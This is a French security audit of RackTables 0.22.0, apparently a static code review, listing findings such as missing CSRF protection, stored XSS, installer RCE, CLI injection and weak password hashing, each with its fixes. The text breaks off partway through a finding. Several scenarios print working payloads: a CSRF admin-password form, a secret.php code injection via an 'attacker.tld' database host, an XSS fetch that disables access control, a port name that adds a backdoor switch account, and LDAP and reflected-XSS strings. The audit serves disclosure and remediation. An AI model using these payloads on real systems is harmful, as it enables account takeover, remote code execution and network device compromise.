# Audit de sécurité RackTables (0.22.0) : revue de code statique

> **État au 24/11/2026 (branche `maintenance`, version 0.22.1)** : les 26 constats sont corrigés, voir la section 0. Le reste du document est l'audit initial, seule la colonne « Statut » du tableau a été mise à jour.

## 0. État des corrections

Chaque correctif a été vérifié en conditions réelles (PHP 8.5, MariaDB 11), en plus des tests unitaires (1000 tests sur PHP 8.2 à 8.5) :

- **XSS** : chaque colonne texte de la base reçoit un marqueur HTML, puis un crawl de toutes les pages (environ 730) cherche ces marqueurs sans échappement ; les 87 formulaires sont fuzzés ; chaque paramètre d'URL est fuzzé (426 requêtes). Aucune sortie non échappée ni double échappement.
- **JavaScript et CSP** : crawl dans Chromium avec jQuery Migrate (aucune erreur, aucun avertissement, aucune violation CSP) et tests d'interaction des widgets (tags, baies, popups, édition en place, RackCode, VST).
- **Authentification** : scénarios HTTP de connexion, session, TOTP (anti-rejeu), changement de mot de passe, `MFA_REQUIRED`, limitation des tentatives ; LDAP contre un OpenLDAP réel (StartTLS, LDAPS, CA non reconnue refusée, groupes, injection de filtre).
- **Docker** : image `php:8.5-apache-trixie` sans CVE HIGH/CRITICAL corrigeable (Trivy), test de fumée dans la CI.

| Refonte | Commit | Contenu |
|---|---|---|
| Échappement | `02e4f148` | Données stockées telles que saisies et échappées à l'affichage ; le lot 0.22.1 décode les colonnes stockées échappées. |
| JavaScript | `4f3d74f8` | jQuery 3.7.1, jQuery UI 1.14.1, plus aucun gestionnaire en ligne ; CSP `script-src 'self' 'nonce-…'`. |
| Authentification | `7903554a`, `60b783e2` | Formulaire et session (expirations, régénération, fin des autres sessions au changement de mot de passe), TOTP optionnel ou obligatoire (`MFA_REQUIRED`), HTTP Basic seulement sur option pour les scripts ; LDAPv3 par défaut. |
| Passerelles | `492b70de`, `7ca097aa` | Mots de passe par stdin, `accept-new`, telnet/netcat seulement avec `allow_cleartext`. |
| CI | `c0f7e29c` | GitHub Actions : lint, PHPUnit (PHP 8.2 à 8.5), image Docker, Trivy. |

**Reste à faire** (modernisation de la section 5.3 et transverses de la section 4, non bloquants) : contrôle d'accès déclaratif centralisé, journal d'audit de sécurité, Composer et `composer audit`, PHPStan/Psalm (taint) et PHPCS en CI, `strict_types` et typage, moteur de gabarits à auto-échappement, chiffrement des mots de passe Cacti/Munin en base, TLS vérifié vers MySQL, `StrictHostKeyChecking=yes` avec `known_hosts` géré, scan DAST (OWASP ZAP) en CI.


- **Périmètre** : `wwwroot/`, `plugins/`, `gateways/`, `scripts/` du dépôt `racktables`
- **Référence** : commit `e5fff9f8` (branche `maintenance`). Toutes les références `fichier:ligne` portent sur ce commit (instantané extrait par `git archive HEAD`). La copie de travail est en cours de portage PHP 8.5 (remplacement de `${var}` par `{$var}`, autant de lignes ajoutées que supprimées). Les numéros de ligne restent donc valables, à ±1 ligne près.
- **Méthode** : revue manuelle ciblée, avec un suivi des données de l'entrée HTTP jusqu'au puits. Aucun test dynamique n'a été lancé. Les problèmes de compatibilité PHP pure sont hors périmètre.
- **Statut des constats** : **confirmé** veut dire que le chemin de données a été tracé dans le code. **À vérifier** veut dire que l'exploitabilité dépend de la configuration ou de l'environnement, ou n'a pas été démontrée de bout en bout.
- **Référentiels** : OWASP Top 10 2021 (+ RC 2025), OWASP ASVS 4.0.3/5.0, CWE Top 25 (2024).

---

## 1. Synthèse

RackTables est une application PHP procédurale ancienne. Elle repose sur une **authentification HTTP Basic** et sur un modèle d'**échappement en entrée** : `transformRequestData()` applique `htmlspecialchars` à tout `$_REQUEST` et garde la valeur brute dans `$sic`. Ce modèle, hérité des *magic quotes*, est la cause racine de la plupart des problèmes. Une partie des handlers stocke la valeur **brute** (`genericAssertion()` / `assertStringArg()` renvoient `$sic`), une autre la valeur **déjà échappée** (`$_REQUEST`). Le rendu suppose de son côté que les données sont déjà échappées et les affiche souvent telles quelles. Il en résulte de nombreuses **XSS stockées**.

Ces XSS deviennent critiques à cause de l'**absence totale de protection CSRF** : toutes les opérations `op=` sont acceptées en GET comme en POST, sans jeton. La moindre XSS stockée, ou une simple page tierce visitée par un administrateur, donne la **prise de contrôle complète** de l'instance : changement du mot de passe `admin`, réécriture des règles RackCode. À partir de là, l'attaquant peut **pousser des commandes sur les équipements réseau**, car l'injection CLI par les noms de ports a été confirmée.

Le **module d'installation** reste accessible sans authentification après l'installation. Il peut réécrire `secret.php` avec du code PHP injecté si le fichier est resté inscriptible, ce qui donne une RCE non authentifiée.

L'authentification est faible : SHA-1 sans sel, comparaison `==` non constante, aucune limitation de tentatives, LDAP vulnérable à l'injection de filtre avec un TLS opportuniste, aucun en-tête de sécurité HTTP, jQuery 1.4.4.

**Points positifs relevés**
- Accès SQL entièrement par PDO avec requêtes préparées. Les identifiants dynamiques (noms de tables et de colonnes) proviennent de constantes du code. **Aucune injection SQL exploitable n'a été trouvée.**
- `escapeshellarg()` est appliqué systématiquement dans `callScript()` (`remote.php:620-631`). Les passerelles Perl utilisent `exec` sous forme de liste.
- `proxyStaticURI()` est protégé contre le path traversal (`RE_STATIC_URI`, `functions.php:53`).
- Le RackCode est un véritable analyseur (pas d'`eval`). La politique par défaut à l'installation est `allow {$userid_1}`.
- `upgrade.php` exige une authentification administrateur.

### Répartition

| Gravité | Nombre |
|---|---|
| Critique | 2 |
| Haute | 6 |
| Moyenne | 10 |
| Basse | 8 |

---

## 2. Tableau des constats (triés par gravité)

| ID | Gravité | Titre | Localisation principale | CWE | OWASP 2021 | Statut |
|---|---|---|---|---|---|---|
| C1 | **Critique** | Aucune protection CSRF, opérations d'écriture déclenchables en GET | `index.php:203-240`, `interface-lib.php:517`, `:1009`, `:1132` | 352 | A01 | Corrigé (`d0fe85d1`) |
| C2 | **Critique** | Installeur accessible sans authentification après installation, injection de code PHP dans `secret.php` | `install.php:7-28`, `:136`, `:239-242`, `index.php:294-299` | 306, 94 | A05/A03 | Corrigé (`1a530e30`) |
| H1 | Haute | XSS stockées multiples (ports, réservations, journal de port, commentaires de fichiers, allocations IP, légendes Cacti/Munin) | `interface.php:1382-1383`, `:1394`, `:4922`, `:4979`, `:5205`, `:6312`, `:6330`, `popup.php:503-504`, `plugins/*/plugin.php:301/309` | 79 | A03 | Corrigé (`be3057e0`, `02e4f148`) |
| H2 | Haute | Téléchargement de fichier : Content-Type contrôlé par l'utilisateur et `asattach=no`, d'où une XSS stockée same-origin | `index.php:57-70`, `ophandlers.php:2505`, `:2533`, `:3559-3570` | 79, 434 | A03/A04 | Corrigé (`c7cf8fcc`) |
| H3 | Haute | Injection de commandes CLI sur les équipements réseau via les noms de ports | `ophandlers.php:779`, `ajax-interface.php:53-59`, `remote.php:273-286`, `deviceconfig.php:1293` | 77, 93 | A03 | Corrigé (`492b70de`) |
| H4 | Haute | Mots de passe en SHA-1 sans sel, comparaison `==` non constante, empreintes du cache LDAP en SHA-1 | `auth.php:416`, `:652`, `ophandlers.php:1067`, `:1083`, `:2160`, `:2170`, `install.php:455`, `upgrade.php:1434` | 916, 759, 208, 697 | A02/A07 | Corrigé (`6423e590`) |
| H5 | Haute | HTTP Basic sans limitation de tentatives, sans verrouillage ni vraie déconnexion, HTTPS non imposé | `auth.php:21-58`, `exceptions.php:136-140` | 307, 319, 613 | A07 | Corrigé (`8ba9e926`, `7903554a`) |
| H6 | Haute | Contournement d'autorisation : la liaison de ports par popup exige seulement le droit de lecture `depot`, en GET | `popup.php:217-281`, `:362-366`, `index.php:266-283` | 862, 285 | A01 | Corrigé (`c58d1195`) |
| M1 | Moyenne | Injection de filtre LDAP sur le nom d'utilisateur | `auth.php:576`, `:617` | 90 | A03 | Corrigé (`dd54ad22`) |
| M2 | Moyenne | LDAP en clair par défaut, STARTTLS opportuniste (rétrogradation) | `auth.php:503-531` | 319, 757 | A02 | Corrigé (`dd54ad22`, `60b783e2`) |
| M3 | Moyenne | XSS réfléchie et handler sans autorisation : `ajax&ac=get-slb-form` | `slb2-interface.php:435-442`, `interface-lib.php:1136` | 79, 862 | A03/A01 | Corrigé (`be3057e0`) |
| M4 | Moyenne | Handlers AJAX sans contrôle d'autorisation (autocomplete, net-usage, get-slb-form, triplet-preview) | `ajax-interface.php:287-338`, `slb2-interface.php:435`, `:490` | 862, 200 | A01 | Corrigé (`be3057e0`) |
| M5 | Moyenne | IDOR : `unlinkPort`, `unlinkFile`, `upd-rack-sort-order` | `ophandlers.php:3362`, `:2582`, `ajax-interface.php:276-285`, `database.php:1551` | 639 | A01 | Corrigé (`c58d1195`) |
| M6 | Moyenne | Pages d'exception : traces avec arguments (mots de passe), cookies, messages PDO non échappés | `exceptions.php:362-447`, `index.php:192`, `:247`, `:313` | 209, 532, 79 | A04/A09 | Corrigé (`c7cf8fcc`) |
| M7 | Moyenne | Aucun en-tête de sécurité (CSP, frame-ancestors/XFO, nosniff, Referrer-Policy, HSTS), cookie de session non durci | (absence globale), `functions.php:6684-6688` | 693, 1021, 614, 1004 | A05 | Corrigé (`c7cf8fcc`, `4f3d74f8`) |
| M8 | Moyenne | Bibliothèques JS vulnérables : jQuery 1.4.4, jQuery UI 1.8.21 | `wwwroot/js/` | 1104, 1395 | A06 | Corrigé (`4f3d74f8`) |
| M9 | Moyenne | Passerelles : mot de passe sur la ligne de commande, `StrictHostKeyChecking=no`, telnet/netcat en clair | `remote.php:387-418`, `gateways/sshnokey` | 214, 295, 319 | A02/A07 | Corrigé (`492b70de`, `7ca097aa`) |
| M10 | Moyenne | `updateUser` remplace le mot de passe par `sha1('')` quand le champ est laissé vide, ce qui verrouille le compte (admin inclus) | `ophandlers.php:1083`, `database.php:3374-3379`, `interface-config.php:47` | 670 | A04 | Corrigé (`6423e590`) |
| B1 | Basse | `unserialize()` sur des données issues de la base | `init.php:66`, `database.php:4914` | 502 | A08 | Corrigé (`6423e590`) |
| B2 | Basse | `Content-Disposition` non quoté ni encodé | `index.php:68` | 116 | A03 | Corrigé (`c7cf8fcc`) |
| B3 | Basse | Caractères génériques `LIKE` non échappés, `REGEXP` contrôlé par l'utilisateur | `ajax-interface.php:310-326`, `popup.php:93-106`, `database.php:3070-3083` | 943, 1333 | A03 | Corrigé (`acb0a0d9`) ; `REGEXP` non atteignable par l'utilisateur |
| B4 | Basse | Injection d'arguments possible dans les passerelles via le nom d'hôte (attribut FQDN) | `functions.php:1193-1206`, `remote.php:419`, `gateways/ssh` | 88 | A03 | Corrigé (`492b70de`) |
| B5 | Basse | Bibliothèques et `secret.php` sous la racine web par défaut | `pre-init.php:37-40` | 552, 538 | A05 | Corrigé (`5c7eb0f0`, image Docker) |
| B6 | Basse | `target="_blank"` sans `rel=noopener`, `.html()` sur une saisie utilisateur (self-XSS) | `functions.php:1288`, `js/inplace-edit.js:147` | 1022, 79 | A03 | Corrigé (`5c7eb0f0`, `be3057e0`) |
| B7 | Basse | `include` dynamique de plugin à partir d'un paramètre (mitigé par `is_callable`) | `ophandlers.php:3712-3729`, `database.php:6162-6164` | 98 | A03 | Corrigé (`c58d1195`) |
| B8 | Basse | Divulgation de version et d'informations de plateforme (installeur non authentifié) | `interface.php:111`, `install.php` étape 2 | 200 | A05 | Corrigé (`7ca097aa`, `1a530e30`) |

---

## 3. Détail des constats

### C1. Absence totale de protection CSRF, opérations d'écriture en GET (Critique, confirmé)

- **CWE-352**, OWASP A01:2021, ASVS 4.0 V4.2.2 / V13.2.3 (ASVS 5 : V3.5).
- **Code** :
  - `wwwroot/index.php:203-240` : le module `redirect` exécute `$ophandler[$pageno][$tabno][$op]` après un simple `assertPermission()`. Aucun jeton n'est vérifié et la méthode HTTP n'est pas contrôlée.
  - `wwwroot/inc/interface-lib.php:517` : `transformRequestData()` fusionne `$_POST + $_GET` dans `$_REQUEST`. Tous les `genericAssertion()` lisent donc indifféremment GET et POST.
  - `interface-lib.php:1009-1036` (`getOpLink`) génère des liens GET pour des opérations destructrices (`deleteUser`, `unlinkFile`, `del`...).
  - `interface-lib.php:1132-1143` (`printOpFormIntro`) : les formulaires n'ont pas de champ caché de jeton.
  - `popup.php:212` déclenche `op=linkObjects` par `opener.location` (GET).
- **Facteur aggravant** : l'authentification est en HTTP Basic. Le navigateur renvoie automatiquement les identifiants en cache lors d'une navigation de premier niveau (formulaire auto-soumis, `window.open`, lien). `SameSite` n'apporte aucune protection ici.
- **Scénario** : un administrateur connecté visite une page piégée (ou une page RackTables contenant une XSS stockée, voir H1) :
  ```html
  <form id=f method=POST action="https://rt.example/index.php?module=redirect&page=userlist&tab=edit&op=updateUser">
    <input name=user_id value=1><input name=username value=admin>
    <input name=realname value=""><input name=password value="Pwn3d!">
  </form><script>f.submit()</script>
  ```
  Le mot de passe de l'administrateur devient celui choisi par l'attaquant. Une autre variante est `op=saveRackCode&rackcode=allow true`, qui supprime tout contrôle d'accès. En GET simple : `<img src="...?module=redirect&page=object&tab=edit&op=deleteObject&object_id=42">`.
- **Recommandation** :
  1. Jeton synchronisé par session, vérifié de façon centrale dans `index.php` avant l'appel de l'ophandler :
     ```php
     // pre-init / init : startSession(); if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
     // printOpFormIntro() / makeHrefProcess() : ajouter csrf_token
     // index.php, case 'redirect', avant call_user_func :
     if ($_SERVER['REQUEST_METHOD'] !== 'POST'
         || ! hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf_token'] ?? ''))
         throw new RTPermissionDenied();
     ```
  2. Refuser toute opération d'écriture en GET : convertir `getOpLink` en mini-formulaires POST ou en `fetch` POST avec jeton.
  3. Même contrôle pour `module=ajax` sur les actions `upd-*`, en exigeant un en-tête `X-CSRF-Token` et le type `application/json`.
  4. En complément, vérifier `Origin`/`Sec-Fetch-Site` et refuser `cross-site`.

### C2. Installeur accessible après installation, RCE non authentifiée par réécriture de `secret.php` (Critique, confirmé si `secret.php` inscriptible)

- **CWE-306, CWE-94, CWE-79** ; OWASP A05/A03 ; ASVS V14.1, V5.2.
- **Code** :
  - `index.php:294-299` : `module=installer` n'inclut pas `init.php`, donc aucune authentification n'a lieu.
  - `install.php:17-28` : l'étape est choisie librement (`?step=N`). Seule l'étape 1 (`not_already_installed`, `:77-91`) vérifie qu'une installation existe déjà, et l'appel direct à `step=3` la contourne.
  - `install.php:136` : la seule garde est `is_writable($path_to_secret_php)`.
  - `install.php:239-242` : écriture **sans échappement** de valeurs brutes de `$_REQUEST` (`transformRequestData()` n'est pas appelé dans ce module) :
    ```php
    fwrite ($conf, "\$db_username = '" . $_REQUEST['mysql_username'] . "';\n");
    fwrite ($conf, "\$db_password = '" . $_REQUEST['mysql_password'] . "';\n\n");
    ```
  - `install.php:116-130` (`print_form`) réaffiche les valeurs brutes dans `value='...'`, ce qui donne une XSS réfléchie non authentifiée.
  - `install.php:438-460` : l'étape 6 crée le compte admin avec un mot de passe choisi par l'appelant si la ligne `user_id=1` n'existe pas encore (course pendant l'installation).
- **Scénario** : `secret.php` reste inscriptible par l'utilisateur httpd. C'est fréquent : l'étape 3 exige `chmod a=rw` et l'étape 4 se contente d'un avertissement. L'attaquant monte un MySQL sur son propre hôte, puis envoie :
  `POST ?module=installer&step=3` avec `save_config=1&conn=conn_tcp&mysql_host=attacker.tld&mysql_db=x&mysql_username=x&mysql_password=x';system($_GET['c']);//`.
  La connexion PDO réussit vers sa base, et `secret.php` contient désormais du code arbitraire, exécuté à chaque requête. Il obtient une RCE, et l'application pointe désormais vers sa base.
- **Recommandation** :
  - Refuser `module=installer` dès que `secret.php` existe et définit `$pdo_dsn`, **quelle que soit l'étape demandée**. Le mieux est de sortir l'installeur du docroot et d'en faire un script CLI.
  - Générer `secret.php` avec `var_export()` :
    ```php
    fwrite($conf, '$db_password = ' . var_export($pw, true) . ";\n");
    ```
  - Après écriture, appliquer `chmod 0440` et vérifier que le fichier n'est plus inscriptible avant de continuer.
  - Échapper toutes les sorties de `print_form()`.

### H1. XSS stockées multiples (Haute, confirmé)

- **CWE-79** ; OWASP A03 ; ASVS V5.3.3.
- **Cause racine** : modèle mixte d'échappement en entrée. `assertStringArg()` (`functions.php:260-270`) renvoie la valeur **brute** `$sic[...]` alors que `$_REQUEST` est échappé. Les handlers qui stockent la valeur brute alimentent des vues qui affichent sans échapper.
- **Instances tracées** :

  | Source (stockage brut) | Puits (rendu non échappé) | Qui peut l'exploiter |
  |---|---|---|
  | `editPortForObject` : nom et libellé `genericAssertion('name'/'label','string')` (`ophandlers.php:779-781`) | `renderObjectPortRow` : `${port['name']}`, `${port['label']}` (`interface.php:1382-1383`), page par défaut de l'objet | droit `editPort` |
  | AJAX `upd-reservation-port` : `genericAssertion('text','string0')` (`ajax-interface.php:220-229`) | `formatPortReservation` (`interface.php:6330`) ; journal de port `$line['message']` (`interface.php:6312`, entrée créée par `database.php:1774/1796`) | droit `editPort` |
  | AJAX `upd-reservation-cable` (`ajax-interface.php:263-273`) | `${port['cableid']}` (`interface.php:1394`) | droit `editPort` |
  | `addFileToEntity`/`addFileWithoutLink` : commentaire `string0` (`ophandlers.php:2505`, `:2533`) | `renderFilesPortlet` / `renderFilesForEntity` : `${file['comment']}` (`interface.php:4922`, `:4979`) | droit d'ajout de fichier sur n'importe quelle entité |
  | `addIPAllocation` : `bond_name` (`ophandlers.php:930`) | `renderRouterCell` : `'@' . $ifname` (`interface.php:5205`) ; `popup.php:503-504` (`${address['name']}`, y compris dans un attribut `onclick`) | droit d'allocation IP |
  | Plugins Cacti/Munin : `caption` `string0` (`plugins/cacti/plugin.php:47`, `plugins/munin/plugin.php:47`) | `"${graph['caption']}"` (`cacti:301`, `munin:309`) | droit `object/cacti/add` |
  | `updateUser` : `username` brut (`ophandlers.php:1077`) | `value='${account['user_name']}'` (`interface-config.php:58`) | administrateurs (faible) |

  L'incohérence est visible au sein d'un même fichier. `renderFile` échappe le commentaire (`interface.php:4745`, `htmlspecialchars`), alors que `renderFilesPortlet` ne l'échappe pas (`:4922`).
- **Scénario** : un utilisateur qui a seulement le droit d'éditer les ports d'un équipement le renomme en `Gi0/1<img src=x onerror="fetch('?module=redirect&page=perms&tab=edit&op=saveRackCode',{method:'POST',body:new URLSearchParams({rackcode:'allow true'})})">`. Dès qu'un administrateur ouvre la fiche de l'objet, tout le contrôle d'accès est supprimé (aucun jeton CSRF, voir C1).
- **Recommandation** :
  1. **Abandonner l'échappement en entrée.** Stocker la donnée brute partout (`$sic`) et échapper **à la sortie**, selon le contexte : HTML, attribut, JS ou URL. Prévoir une migration de données pour « déséchapper » les champs stockés en entités HTML, sinon ils seront doublement encodés.
  2. Fournir des helpers uniques et imposer leur usage par une règle PHPCS/PHPStan :
     ```php
     function h(?string $s): string { return htmlspecialchars((string)$s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
     function js(mixed $v): string { return json_encode($v, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT|JSON_THROW_ON_ERROR); }
     ```
  3. À moyen terme, passer à un moteur de gabarits avec auto-échappement (Twig, Plates, Latte), et ajouter une CSP stricte (M7) en défense en profondeur.

### H2. Téléchargement de fichiers : Content-Type contrôlé par l'attaquant et rendu inline (Haute, confirmé)

- **CWE-79, CWE-434, CWE-116** ; OWASP A03/A04 ; ASVS V12.5.2, V14.4.
- **Code** :
  - `index.php:63-70` : `header("Content-Type: {$file['type']}")`. Le type vient de la base, et la valeur `asattach=no` du paramètre supprime `Content-Disposition`.
  - `ophandlers.php:2505`, `:2533` : le type stocké est `$_FILES['file']['type']`, donc **déclaré par le client**.
  - `ophandlers.php:3559-3570` (`updateFile`) : `file_type` est librement modifiable (`string`).
  - Ni `X-Content-Type-Options: nosniff`, ni CSP `sandbox`.
- **Scénario** : un utilisateur dépose `x.html` (ou `x.svg` avec `<script>`) avec le type `text/html`, puis envoie le lien `index.php?module=download&file_id=N&asattach=no` à un administrateur. Le JavaScript s'exécute sur l'origine RackTables, avec les identifiants Basic de la victime.
- **Recommandation** :
  - Déterminer le type côté serveur (`finfo_buffer`) et appliquer une **liste blanche** (images raster, PDF, text/plain).
  - Servir tout le reste en `application/octet-stream` + `Content-Disposition: attachment`.
  - Envoyer systématiquement `X-Content-Type-Options: nosniff` et `Content-Security-Policy: sandbox; default-src 'none'` sur `module=download`.
  - N'accepter `asattach=no` que pour les images de la liste blanche.
  - Idéalement, servir les fichiers depuis un domaine distinct sans cookies ni identifiants.

### H3. Injection de commandes CLI sur les équipements réseau (Haute, confirmé)

- **CWE-77, CWE-93** (injection de saut de ligne) ; OWASP A03.
- **Chemin tracé** :
  1. `editPortForObject` (`ophandlers.php:779`) stocke `name` brut. `dos2unix` conserve `\n`, et ni `commitUpdatePort` (`database.php:1728`) ni `commitUpdatePortReal` ne valident les caractères de contrôle.
  2. `ajax&ac=get-port-portmac` (`ajax-interface.php:53-59`) : `port_name` est accepté s'il est présent dans les noms de ports de l'objet en base.
  3. `queryDevice($object_id, 'getportmaclist', [$port_name])` (`remote.php:273-286`), puis `translateDeviceCommands`.
  4. `ios12TranslatePushQueue` produit `"show mac address-table dynamic interface {$cmd['arg1']}\n"` (`deviceconfig.php:1293`). La même interpolation de `arg1`/`arg2` se retrouve dans tous les traducteurs (`interface ${cmd['arg1']}` : `deviceconfig.php:1237-1252`, etc.).
  5. Le texte est envoyé sur l'entrée standard de la passerelle telnet/netcat/ssh (`remote.php:576-580`), connectée **avec les identifiants privilégiés** fournis par `terminal_settings()`.
- **Scénario** : un utilisateur qui a les droits `editPort` et `liveports` (opération `get_port_mac_list`) renomme un port en `Gi0/1\nconfigure terminal\nusername backdoor privilege 15 secret X\nend\nwrite memory`, puis déclenche l'appel AJAX. Les commandes s'exécutent sur le commutateur. Le même risque s'applique aux noms de VLAN et de ports utilisés par le déploiement 802.1Q.
- **Recommandation** :
  - Valider strictement les noms de ports à l'entrée (`/^[\w\/.:\-]{1,64}$/u`, sans aucun caractère de contrôle) **et** au moment de construire les commandes. Ajouter un garde-fou central dans `translateDeviceCommands()` :
    ```php
    foreach ($crq as $cmd) foreach ($cmd as $k => $v)
        if (is_string($v) && preg_match('/[\x00-\x1F\x7F]/', $v))
            throw new InvalidArgException($k, $v, 'control characters are not allowed');
    ```
  - Utiliser un compte d'équipement à moindre privilège (lecture seule) pour les commandes de consultation.

### H4. Stockage et comparaison des mots de passe (Haute, confirmé)

- **CWE-916, CWE-759, CWE-208, CWE-697** ; OWASP A02/A07 ; ASVS V2.4.1, V2.4.4 (ASVS 5 : V11.4.2).
- **Code** :
  - `auth.php:652` : `return $userinfo['user_password_hash'] == sha1 ($password);`. SHA-1 sans sel ni itérations, et comparaison **lâche** et non constante. En PHP 7, deux empreintes du type « magic hash » `0e[0-9]{38}` sont égales.
  - `ophandlers.php:1067`, `:1083` : création et mise à jour en `sha1()` ; `:2160` : `!= sha1(oldpassword)` ; `:2170`.
  - `install.php:455`, `upgrade.php:1434` : SHA-1.
  - `auth.php:416` : cache LDAP `sha1($password)` stocké dans `LDAPCache.successful_hash`. Les mots de passe d'annuaire peuvent donc être cassés hors ligne en cas de fuite de la base.
  - Aucune politique de complexité ou de longueur minimale, aucune vérification contre une liste de mots de passe compromis.
- **Scénario** : fuite de la base (sauvegarde, injection SQL ailleurs, accès DBA). Les SHA-1 non salés tombent en quelques secondes ou minutes sur GPU ou avec des tables arc-en-ciel, y compris les mots de passe AD présents dans le cache LDAP.
- **Recommandation** : migration transparente vers `password_hash()` (Argon2id) :
  ```php
  function authenticated_via_database(array $u, string $pw): bool {
      $h = $u['user_password_hash'] ?? '';
      if (str_starts_with($h, '$argon2id$') || str_starts_with($h, '$2y$')) {
          $ok = password_verify($pw, $h);
          if ($ok && password_needs_rehash($h, PASSWORD_ARGON2ID)) commitUpdatePasswordHash($u['user_id'], password_hash($pw, PASSWORD_ARGON2ID));
          return $ok;
      }
      if (hash_equals($h, sha1($pw))) { // migration paresseuse
          commitUpdatePasswordHash($u['user_id'], password_hash($pw, PASSWORD_ARGON2ID));
          return true;
      }
      return false;
  }
  ```
  - Élargir `UserAccount.user_password_hash` (actuellement `char(40)`) à `VARCHAR(255)` et retirer le contrôle `^[0-9a-f]{40}$` (`database.php:3376`).
  - Pour le cache LDAP, utiliser `password_hash` ou un HMAC avec une clé serveur.
  - Utiliser `hash_equals()` pour toute comparaison de secrets.

### H5. HTTP Basic sans protection contre la force brute (Haute, confirmé)

- **CWE-307, CWE-319, CWE-613** ; OWASP A07 ; ASVS V2.2.1, V3.3.
- **Code** : `auth.php:21-58` : identifiants Basic vérifiés à **chaque** requête. Aucun compteur d'échecs, aucun délai, aucun verrou. `?logout` renvoie seulement un 401 (`auth.php:44-49`, `exceptions.php:136-140`), et le navigateur garde les identifiants en cache. L'application n'impose ni HTTPS ni HSTS, alors que Basic transmet le mot de passe encodé en base64 à chaque requête.
- **Scénario** : force brute parallèle illimitée sur `admin` (le compte `user_id=1` est toujours authentifié localement, `auth.php:101-108`), y compris via `?module=upgrade`. SHA-1 étant rapide, le coût est négligeable côté serveur.
- **Recommandation** :
  - Court terme : `fail2ban` sur les 401, limitation de débit au reverse-proxy, redirection HTTPS et HSTS.
  - Moyen terme : remplacer Basic par une authentification par formulaire avec session PHP durcie (`session_regenerate_id(true)` à la connexion, expiration d'inactivité et absolue, déconnexion réelle), un compteur d'échecs par compte et par IP avec délai exponentiel, et une MFA (TOTP/WebAuthn) pour les administrateurs. Sinon, déléguer à un IdP via le mode `saml` existant ou OIDC.

### H6. Contournement d'autorisation dans la popup de liaison de ports (Haute, confirmé)

- **CWE-862, CWE-285, CWE-352** ; OWASP A01.
- **Code** :
  - `popup.php:362-365` : si `do_link` est présent, on appelle `handlePopupPortLink()`.
  - `popup.php:219` : la seule vérification est `assertPermission('depot','default')`, une permission de **lecture**.
  - `popup.php:249-265` : puis `commitUpdatePortOIF()`, `linkPorts()`, `commitModifyPatchCableAmount()`, sans contrôle de l'opération, sans contexte de l'objet propriétaire des ports, et en **GET** (formulaire `method=GET`, `:323`).
  - `index.php:266-271` : `prepareNavigation()`, `fixContext()` et `assertPermission()` utilisent les paramètres `page`/`tab` **choisis par l'attaquant** (par exemple `page=index`).
- **Scénario** : un compte en lecture seule (`allow {$tab_default}`) appelle `?module=popup&helper=portlist&port=10&remote_port=20&do_link=1&cable=X` et relie n'importe quels ports de n'importe quel équipement, ce qui modifie la topologie et les types de ports. C'est aussi déclenchable par CSRF.
- **Recommandation** : traiter la liaison comme une opération ordinaire `op=linkPort` dans le module `redirect`, en POST avec jeton. Faire `fixContext(spotEntity('object', $port_info['object_id']))` puis `assertPermission('object','ports','linkPort')` pour **les deux** extrémités, et ne jamais faire confiance à `page`/`tab` dans les popups.

### M1. Injection de filtre LDAP (Moyenne, confirmé, impact à vérifier)

- **CWE-90** ; OWASP A03 ; ASVS V5.3.7.
- **Code** : `auth.php:576` et `:617` : `'(' . $LDAP_options['search_attr'] . "=${username})"`. `$username` vient de `PHP_AUTH_USER`, passé par `htmlspecialchars` (`interface-lib.php:535-536`), qui n'échappe ni `*`, ni `(`, ni `)`, ni `\`, ni NUL.
- **Scénario** : le nom `jdo*` correspond à une seule entrée. Le bind se fait avec le DN de `jdoe` et son mot de passe, mais `$remote_username` vaut `jdo*`. Avec `require_local_account = FALSE`, les autotags `$username_jdo*` et l'identité journalisée (`ObjectLog.user`) ne correspondent plus à l'utilisateur réel : usurpation de l'imputabilité et contournement de règles RackCode basées sur `{$username_...}`. Des filtres comme `x)(|(uid=*` permettent aussi d'énumérer les attributs de l'annuaire (réponses NAK/CAN différentes).
- **Recommandation** : `ldap_escape($username, '', LDAP_ESCAPE_FILTER)`, rejet des noms qui ne respectent pas `^[A-Za-z0-9._@-]{1,64}$`, et utilisation de l'identité **retournée par l'annuaire** (attribut `search_attr` de l'entrée) comme `$remote_username`.

### M2. LDAP en clair et STARTTLS opportuniste (Moyenne, confirmé)

- **CWE-319, CWE-757** ; OWASP A02 ; ASVS V9.2.
- **Code** : `auth.php:503-531` : sans `use_tls`, le simple bind (mot de passe de l'utilisateur) circule en clair sur le port 389. Avec `use_tls=1`, un échec de `ldap_start_tls()` est ignoré et le bind continue en clair, ce qui permet une rétrogradation par un attaquant actif. Aucune option `LDAP_OPT_X_TLS_REQUIRE_CERT` n'est positionnée.
- **Recommandation** : `use_tls=2` par défaut, ou `ldaps://`, avec `ldap_set_option(NULL, LDAP_OPT_X_TLS_REQUIRE_CERT, LDAP_OPT_X_TLS_DEMAND)` et un CA configuré. Refuser l'authentification si TLS n'est pas établi.

### M3. XSS réfléchie via `ajax&ac=get-slb-form` (Moyenne, confirmé)

- **CWE-79, CWE-862**.
- **Code** : `slb2-interface.php:438-442` : `parse_str(assertStringArg('action'))` (valeur brute), puis `$pageno = $action['page']; $tabno = $action['tab']; printOpFormIntro($action['op'], ...)`. `interface-lib.php:1136` affiche `id=${opname} name=${opname} action='...page=${pageno}&tab=${tabno}&op=${opname}'` **sans échappement**. La réponse AJAX n'a pas de `Content-Type` explicite (`text/html` par défaut). Le handler ne vérifie aucune permission.
- **Scénario** : la victime ouvre `index.php?module=ajax&ac=get-slb-form&form=object_id%3D1%26vs_id%3D1%26rspool_id%3D1&action=op%3D%253E%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E`. Les identifiants doivent être valides pour éviter l'exception, qui viderait le tampon.
- **Recommandation** : échapper les trois valeurs dans `printOpFormIntro()` (`h()`), valider `op`/`page`/`tab` contre `$ophandler`, ajouter `assertPermission` sur le contexte, et renvoyer `Content-Type: text/html; charset=UTF-8` + `nosniff`.

### M4. Handlers AJAX sans autorisation (Moyenne, confirmé)

- **CWE-862, CWE-200** ; OWASP A01 ; ASVS V4.1.3.
- **Code** : `index.php:170-180` : le module `ajax` n'appelle pas `assertPermission()`, chaque handler doit le faire lui-même. Ne le font pas :
